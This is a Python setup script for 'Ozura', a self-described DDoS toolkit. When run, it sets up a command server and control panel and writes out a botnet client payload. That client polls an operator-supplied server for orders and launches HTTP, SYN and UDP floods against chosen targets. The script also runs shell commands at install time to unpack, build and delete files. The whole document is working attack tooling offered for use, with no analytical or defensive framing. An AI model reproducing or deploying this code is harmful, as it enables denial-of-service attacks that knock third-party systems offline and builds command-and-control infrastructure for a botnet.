#!/usr/bin/env python

import sys
import json
import os
from zipfile import ZipFile

if sys.version_info[0] != 3:
    sys.exit('Python 3 is needed for use Ozura')

from setuptools import setup, find_packages

setup(
    name = 'ozura',
    version = '1.0',
    author = 'NaN',
    description = 'DDoS tool kit using http/syn/udp flood',
    packages = find_packages(),
    install_requires = [ 'scapy >= 2.4.4', 'requests >= 2.25.1' ],
    include_package_data = True,
    zip_safe = False
)

with ZipFile('Ozura.zip', 'r') as zipObj:
    zipObj.extractall()
os.system('cmd /c "del "Ozura.zip"')

os.system('cls||clear')
serverURL = input('Your server url (with http/s): ')
token = input('Enter a token for auth the hacker: ')
user_token = input('Enter a token for auth the users: ')
port = int(input('Enter your port: '))
os.system('cls||clear')

config_json = {
    "token": token,
    "serverURL": serverURL,
    "server": {
        "ip": "0.0.0.0",
        "port": port
    }
}

config_js = {
    'token': token,
    'baseURL': serverURL
}
open('./Ozura_Manager/web/js/config.js', 'w').write(f'const config = {json.dumps(config_json)}')

config_server = {
    "port": port,
    "ip": '0.0.0.0',
    "rootToken": token,
    "userToken": user_token,
    "os": [
        "Windows",
        "Java",
        "Darwin",
        "Linux"
    ]
}
open('./Ozura_Server/config.json', 'w').write(json.dumps(config_server))

print('Install Electron libs for compiling Ozura Control Panel ...')
os.system('cmd /c "cd Ozura_Manager && npm i && cd ../"')
os.system('cls||clear')
print('Compiling Ozura Control Panel ...')
os.system('cmd /c "electron-packager ./Ozura_Manager OzuraControlPanel"')
os.system('cmd /c "rd /s /q "Ozura_Manager"')
os.system('cls||clear')
print('Ozura Control Panel is extracted !')

print('Create the base payload ...')
open('./Ozura_Client/main.py', 'w').write("from scapy.all import *\nimport socket\nimport random\nimport requests\nimport json\nfrom threading import Timer\nimport platform\n\nbase_url = " + f"'{serverURL}'" + "\nuser_token = " + f"'{user_token}'" + "\n\napi = {'httpFlood': False,'synFlood': False,'udpFlood': False}\n\ndef host_monitor():\n    req = requests.get(base_url + '/api/command').json()\n    if (req['code'] != 200):\n        requests.get(base_url + '/api/callback', headers={'os': platform.system(), 'token': user_token})\n    else:\n        api['httpFlood'] = req['message']['httpFlood']\n        api['synFlood'] = req['message']['synFlood']\n        api['udpFlood'] = req['message']['udpFlood']\n    Timer(30, host_monitor).start()\nhost_monitor()\n\ndef ddos():\n\n    if api['httpFlood'] != False:\n        requests.get(api['httpFlood'])\n    else:\n        if api['synFlood'] != False:\n            send(IP(dst=api['synFlood'].split(':')[0]) / TCP(sport=RandShort(), dport=int(api['synFlood'].split(':')[1]), flags=\"S\") / Raw(b\"X\"*1024), verbose=0)\n        else:\n            if api['udpFlood'] != False:\n                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n                udp.sendto(random._urandom(65500), (api['udpFlood'].split(':')[0], int(api['udpFlood'].split(':')[1])))\n                udp.sendto((\"X\" * 1472).encode(), (api['udpFlood'].split(':')[0], int(api['udpFlood'].split(':')[1])))\n    Timer(1, ddos).start()\nddos()")
print('Base payload created ! (Ozura_Client/main.py)')